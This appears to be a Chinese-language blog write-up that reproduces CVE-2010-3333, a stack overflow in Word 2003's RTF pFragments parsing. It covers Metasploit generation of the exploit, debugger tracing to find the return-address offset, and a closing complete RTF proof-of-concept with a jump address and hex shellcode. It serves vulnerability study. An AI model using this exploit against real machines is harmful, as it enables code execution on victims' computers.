---
layout:		post
title:		CVE-2010-3333分析 & 复现
author:		wooy0ung
tags:		cve
category:  	exploit
---


>[分析环境]  
>系统: Windows XP SP3  
>漏洞软件: Microsoft Office Word 2003 SP3  
>注意: 需要安装英文版, 安装后不是SP3的记得打上SP3的补丁包。  
>摘要: CVE-2010-3333(MS10-087)是Microsoft Office Word在处理RTF文档的绘图pFragments属性时产生的一个栈溢出漏洞。
<!-- more -->


### 0x00 前期准备

安装Microsoft Office 2003 SP3 & 生成msf.rtf

```
msf > use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof
msf > info
msf > set target 6
msf > run
```

![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x00.png)

启动Word, WinDbg附加上去, 打开msf.rtf触发异常, 断在了内存copy指令rep movs(0x30ed442c)上

![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x01.png)

发现该指令往READONLY内存区域写数据, 触发异常

![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x02.png)

定位mso.dll模块的路径

```
# 以上用到的命令
> db esi
> db edi
> !address edi
> lmm mso v
```


### 0x01 栈回溯

重新载入, 在0x30ed442c下断, 定位崩溃函数的调用函数

![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x03.png)
![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x04.png)

目标函数地址0x30f0b5c2, 下断, 重新载入, 单步到30F0B5F8 call dword ptr [eax+1Ch]跟进去

![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x05.png)

定位到30ED4424 add esi, [eax+10h], 此处赋值esi=1005000c, 指向存放rtf pFragments数据的地址

![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x06.png)

再单步到30ED442C rep movsd, ecx=0xc8ac(需要copy的字节数)/4=0x322b

![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x07.png)

F5直接运行, 触发异常, 打印待copy的数据

![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x08.png)

对比PoC, ecx长度过大, 覆盖到不可写区域崩溃掉

![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x09.png)
![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x0a.png)

```
#以上用到的命令
> bp 30ed442c
> kb
> ub mso!Ordinal1273+0x2581
```


### 0x02 静态分析

打开IDA, 载入mso.dll, 定位到30ED4407 mov edi, [esp+4+arg_4]

![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x0b.png)

edi指向一个栈地址, 看一下栈布局, 从arg_4开始覆盖

![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x0c.png)

定位到sub_30f0b5c2, 再看看调用函数的栈布局

![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x0d.png)

返回地址偏移上面arg_4 0x18-0x08+0x04=0x14 byte, 也就是任意填充14byte就到达返回地址


### 0x03 手工构造PoC

截取msf.rtf的头部

![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x0e.png)

填充14 byte 1111...后,再填充4byte 2222...., 最后填充}}}}将数据封闭上

![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x0f.png)

这里14byte、4byte是对栈数据来说, 实际上上WinHex上分别要填充28byte、8byte

![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x10.png)

Windbg附加上去, 在30F0B6BA retn 14h断下, 单步一下, 发现eip=22222222, 成功劫持了eip

![](/assets/img/exploit/2017-09-23-cve-2010-3333/0x11.png)

下面就是构造rop了, 不再赘述, 完整的PoC如下, pwn!

```
# 0x7ffa4512(万能跳)+0x28byte * '0'+shellcode
{\rtf1{\shp{\sp{\sn pFragments}{\sv 5;3;11111111111111111111111111111111111111111111111111111245fa7f000000000000000000000000000000000000000031d2b230648b128b520c8b521c8b42088b72208b12807e0c3375f289c703783c8b577801c28b7a2001c731ed8b34af01c645813e4661746175f2817e084578697475e98b7a2401c7668b2c6f8b7a1c01c78b7caffc01c76867202001687930756e6820776f6f89e1fe490b31c05150ffd7}}}}
```